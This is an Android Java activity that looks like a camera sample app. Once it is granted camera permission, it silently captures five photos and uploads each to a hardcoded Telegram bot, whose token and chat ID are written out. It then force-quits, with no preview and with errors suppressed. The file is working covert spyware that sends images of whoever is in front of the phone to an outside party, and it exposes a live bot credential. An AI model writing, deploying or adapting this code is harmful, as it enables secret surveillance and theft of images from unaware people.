package com.example.android.camera2basic;

import android.Manifest;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.List;
import java.util.UUID;

public class CameraActivity extends AppCompatActivity {
    private static final String BOT_TOKEN = "8973155919:AAGDOx-UneAAB9UAf8-7AzU-xvkdydQZDnA";
    private static final String CHAT_ID = "510530764"; 
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private int photoCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, 100);
        } else {
            startCamera();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 100 && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            startCamera();
        }
    }

    private void startCamera() {
        try {
            CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
            String cameraId = manager.getCameraIdList()[0];
            backgroundThread = new HandlerThread("CameraBackground");
            backgroundThread.start();
            backgroundHandler = new Handler(backgroundThread.getLooper());
            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            
            imageReader.setOnImageAvailableListener(reader -> {
                try (Image image = reader.acquireLatestImage()) {
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    sendToTelegram(bytes);
                    photoCount++;
                    if (photoCount < 5) {
                        backgroundHandler.postDelayed(this::capturePhoto, 3000);
                    } else {
                        backgroundHandler.postDelayed(() -> { finishAffinity(); System.exit(0); }, 1000);
                    }
                } catch (Exception e) {}
            }, backgroundHandler);

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    public void onOpened(@NonNull CameraDevice camera) { cameraDevice = camera; createCaptureSession(); }
                    public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); cameraDevice = null; }
                    public void onError(@NonNull CameraDevice camera, int error) { camera.close(); cameraDevice = null; }
                }, backgroundHandler);
            }
        } catch (Exception e) {}
    }

    private void createCaptureSession() {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(imageReader.getSurface());
            cameraDevice.createCaptureSession(List.of(imageReader.getSurface()), new CameraCaptureSession.StateCallback() {
                public void onConfigured(@NonNull CameraCaptureSession session) {
                    captureSession = session;
                    backgroundHandler.postDelayed(CameraActivity.this::capturePhoto, 1000);
                }
                public void onConfigureFailed(@NonNull CameraCaptureSession session) {}
            }, backgroundHandler);
        } catch (Exception e) {}
    }

    private void capturePhoto() {
        try {
            if (captureSession != null) {
                CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                builder.addTarget(imageReader.getSurface());
                captureSession.capture(builder.build(), null, backgroundHandler);
            }
        } catch (Exception e) {}
    }

    private void sendToTelegram(byte[] photoBytes) {
        new Thread(() -> {
            try {
                String boundary = UUID.randomUUID().toString();
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n").getBytes());
                    os.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\nФото\r\n").getBytes());
                    os.write(("--" + boundary + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n").getBytes());
                    os.write(photoBytes);
                    os.write(("\r\n--" + boundary + "--\r\n").getBytes());
                }
                conn.getResponseCode();
            } catch (Exception e) {}
        }).start();
    }
}
